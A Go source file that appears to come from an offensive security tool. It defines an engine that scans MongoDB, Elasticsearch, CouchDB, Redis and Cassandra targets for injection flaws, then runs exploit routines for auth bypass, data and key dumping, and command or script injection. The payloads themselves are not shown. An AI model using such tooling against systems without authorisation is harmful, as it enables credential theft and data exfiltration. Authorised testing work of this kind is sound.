package nosql

import (
	"fmt"
	"time"

	"github.com/angel-platform/angel/pkg/logger"
)

type NoSQLEngine struct {
	config     *NoSQLConfig
	httpClient *HTTPClient
	log        *logger.Logger
}

func NewNoSQLEngine(config *NoSQLConfig) *NoSQLEngine {
	if config == nil {
		config = DefaultNoSQLConfig()
	}

	return &NoSQLEngine{
		config:     config,
		httpClient: NewHTTPClient(config),
		log:        logger.New("nosql-engine", logger.LevelInfo),
	}
}

func (e *NoSQLEngine) Scan(target string) (*ScanResult, error) {
	e.log.Info("Starting NoSQL injection scan against %s", target)

	result := &ScanResult{
		Target:    target,
		Timestamp: time.Now(),
	}

	for _, dbType := range e.config.DBTypes {
		e.log.Debug("Testing %s injection vectors", dbType)

		switch dbType {
		case NoSQLDBMongoDB:
			e.scanMongoDB(target, result)
		case NoSQLDBElasticsearch:
			e.scanElasticsearch(target, result)
		case NoSQLDBCouchDB:
			e.scanCouchDB(target, result)
		case NoSQLDBRedis:
			e.scanRedis(target, result)
		case NoSQLDBCassandra:
			e.scanCassandra(target, result)
		}
	}

	e.log.Info("Scan complete: %s", result.Summary())
	return result, nil
}

func (e *NoSQLEngine) Exploit(injection *InjectionPoint) (*ExploitResult, error) {
	if injection == nil {
		return nil, fmt.Errorf("injection point is nil")
	}

	e.log.Info("Exploiting %s injection on %s", injection.Technique, injection.DBType)

	result := &ExploitResult{
		Injection: injection,
		Timestamp: time.Now(),
	}

	switch injection.DBType {
	case NoSQLDBMongoDB:
		return e.exploitMongoDB(injection, result)
	case NoSQLDBElasticsearch:
		return e.exploitElasticsearch(injection, result)
	case NoSQLDBCouchDB:
		return e.exploitCouchDB(injection, result)
	case NoSQLDBRedis:
		return e.exploitRedis(injection, result)
	case NoSQLDBCassandra:
		return e.exploitCassandra(injection, result)
	default:
		return nil, fmt.Errorf("unsupported database type: %s", injection.DBType)
	}
}

func (e *NoSQLEngine) scanMongoDB(target string, result *ScanResult) {
	m := NewMongoDBScanner(e.config, e.httpClient)

	if m.TestConnection(target) {
		result.DBType = NoSQLDBMongoDB
		result.Version = m.GetVersion(target)

		dbs := m.ListDatabases(target)
		result.Databases = dbs

		for _, db := range dbs {
			collections := m.ListCollections(target, db)
			result.Collections = append(result.Collections, collections...)
		}

		if e.hasTechnique(TechniqueAuthBypass) {
			if inj := m.TestAuthBypass(target); inj != nil {
				result.AddInjection(*inj)
			}
		}

		if e.hasTechnique(TechniqueBooleanBlind) {
			if inj := m.TestBooleanBlind(target); inj != nil {
				result.AddInjection(*inj)
			}
		}

		if e.hasTechnique(TechniqueTimeBased) {
			if inj := m.TestTimeBased(target); inj != nil {
				result.AddInjection(*inj)
			}
		}

		if e.hasTechnique(TechniqueJSInject) {
			if inj := m.TestJSInject(target); inj != nil {
				result.AddInjection(*inj)
			}
		}

		if e.hasTechnique(TechniqueLookupExfil) {
			if inj := m.TestLookupExfil(target); inj != nil {
				result.AddInjection(*inj)
			}
		}
	}
}

func (e *NoSQLEngine) scanElasticsearch(target string, result *ScanResult) {
	es := NewESScanner(e.config, e.httpClient)

	if es.TestConnection(target) {
		result.DBType = NoSQLDBElasticsearch
		result.Version = es.GetVersion(target)

		indices := es.ListIndices(target)
		result.Collections = indices

		if e.hasTechnique(TechniqueQueryInject) {
			if inj := es.TestQueryInject(target); inj != nil {
				result.AddInjection(*inj)
			}
		}

		if e.hasTechnique(TechniqueAggregation) {
			if inj := es.TestAggregationExfil(target); inj != nil {
				result.AddInjection(*inj)
			}
		}

		if e.hasTechnique(TechniqueScriptInject) {
			if inj := es.TestScriptInject(target); inj != nil {
				result.AddInjection(*inj)
			}
		}
	}
}

func (e *NoSQLEngine) scanCouchDB(target string, result *ScanResult) {
	couch := NewCouchDBScanner(e.config, e.httpClient)

	if couch.TestConnection(target) {
		result.DBType = NoSQLDBCouchDB
		result.Version = couch.GetVersion(target)

		dbs := couch.ListDatabases(target)
		result.Databases = dbs

		if e.hasTechnique(TechniqueAuthBypass) {
			if inj := couch.TestAuthBypass(target); inj != nil {
				result.AddInjection(*inj)
			}
		}

		if e.hasTechnique(TechniqueJSInject) {
			if inj := couch.TestJSInject(target); inj != nil {
				result.AddInjection(*inj)
			}
		}
	}
}

func (e *NoSQLEngine) scanRedis(target string, result *ScanResult) {
	redis := NewRedisScanner(e.config, e.httpClient)

	if redis.TestConnection(target) {
		result.DBType = NoSQLDBRedis
		result.Version = redis.GetVersion(target)

		if e.hasTechnique(TechniqueCommandInject) {
			if inj := redis.TestCommandInject(target); inj != nil {
				result.AddInjection(*inj)
			}
		}

		if e.hasTechnique(TechniqueKeyDump) {
			if inj := redis.TestKeyDump(target); inj != nil {
				result.AddInjection(*inj)
			}
		}
	}
}

func (e *NoSQLEngine) scanCassandra(target string, result *ScanResult) {
	cass := NewCassandraScanner(e.config, e.httpClient)

	if cass.TestConnection(target) {
		result.DBType = NoSQLDBCassandra
		result.Version = cass.GetVersion(target)

		keyspaces := cass.ListKeyspaces(target)
		result.Databases = keyspaces

		if e.hasTechnique(TechniqueCQLInject) {
			if inj := cass.TestCQLInject(target); inj != nil {
				result.AddInjection(*inj)
			}
		}
	}
}

func (e *NoSQLEngine) exploitMongoDB(injection *InjectionPoint, result *ExploitResult) (*ExploitResult, error) {
	m := NewMongoDBScanner(e.config, e.httpClient)

	switch injection.Technique {
	case TechniqueAuthBypass:
		creds, err := m.ExploitAuthBypass(injection)
		if err != nil {
			result.Error = err.Error()
			return result, nil
		}
		result.Success = true
		result.Credentials = creds
		result.Data = map[string]interface{}{
			"technique": "auth_bypass",
			"method":    "$ne/$gt/$regex",
		}

	case TechniqueBooleanBlind:
		data, err := m.ExploitBooleanBlind(injection)
		if err != nil {
			result.Error = err.Error()
			return result, nil
		}
		result.Success = true
		result.Data = data

	case TechniqueTimeBased:
		data, err := m.ExploitTimeBased(injection)
		if err != nil {
			result.Error = err.Error()
			return result, nil
		}
		result.Success = true
		result.Data = data

	case TechniqueJSInject:
		output, err := m.ExploitJSInject(injection)
		if err != nil {
			result.Error = err.Error()
			return result, nil
		}
		result.Success = true
		result.CmdOutput = output

	case TechniqueLookupExfil:
		data, err := m.ExploitLookupExfil(injection)
		if err != nil {
			result.Error = err.Error()
			return result, nil
		}
		result.Success = true
		result.Data = data
	}

	return result, nil
}

func (e *NoSQLEngine) exploitElasticsearch(injection *InjectionPoint, result *ExploitResult) (*ExploitResult, error) {
	es := NewESScanner(e.config, e.httpClient)

	switch injection.Technique {
	case TechniqueQueryInject:
		data, err := es.ExploitQueryInject(injection)
		if err != nil {
			result.Error = err.Error()
			return result, nil
		}
		result.Success = true
		result.Data = data

	case TechniqueAggregation:
		data, err := es.ExploitAggregationExfil(injection)
		if err != nil {
			result.Error = err.Error()
			return result, nil
		}
		result.Success = true
		result.Data = data

	case TechniqueScriptInject:
		output, err := es.ExploitScriptInject(injection)
		if err != nil {
			result.Error = err.Error()
			return result, nil
		}
		result.Success = true
		result.CmdOutput = output
	}

	return result, nil
}

func (e *NoSQLEngine) exploitCouchDB(injection *InjectionPoint, result *ExploitResult) (*ExploitResult, error) {
	couch := NewCouchDBScanner(e.config, e.httpClient)

	switch injection.Technique {
	case TechniqueAuthBypass:
		creds, err := couch.ExploitAuthBypass(injection)
		if err != nil {
			result.Error = err.Error()
			return result, nil
		}
		result.Success = true
		result.Credentials = creds

	case TechniqueJSInject:
		output, err := couch.ExploitJSInject(injection)
		if err != nil {
			result.Error = err.Error()
			return result, nil
		}
		result.Success = true
		result.CmdOutput = output
	}

	return result, nil
}

func (e *NoSQLEngine) exploitRedis(injection *InjectionPoint, result *ExploitResult) (*ExploitResult, error) {
	redis := NewRedisScanner(e.config, e.httpClient)

	switch injection.Technique {
	case TechniqueCommandInject:
		output, err := redis.ExploitCommandInject(injection)
		if err != nil {
			result.Error = err.Error()
			return result, nil
		}
		result.Success = true
		result.CmdOutput = output

	case TechniqueKeyDump:
		data, err := redis.ExploitKeyDump(injection)
		if err != nil {
			result.Error = err.Error()
			return result, nil
		}
		result.Success = true
		result.Data = data
	}

	return result, nil
}

func (e *NoSQLEngine) exploitCassandra(injection *InjectionPoint, result *ExploitResult) (*ExploitResult, error) {
	cass := NewCassandraScanner(e.config, e.httpClient)

	switch injection.Technique {
	case TechniqueCQLInject:
		data, err := cass.ExploitCQLInject(injection)
		if err != nil {
			result.Error = err.Error()
			return result, nil
		}
		result.Success = true
		result.Data = data
	}

	return result, nil
}

func (e *NoSQLEngine) hasTechnique(technique InjectionTechnique) bool {
	for _, t := range e.config.Techniques {
		if t == technique {
			return true
		}
	}
	return false
}
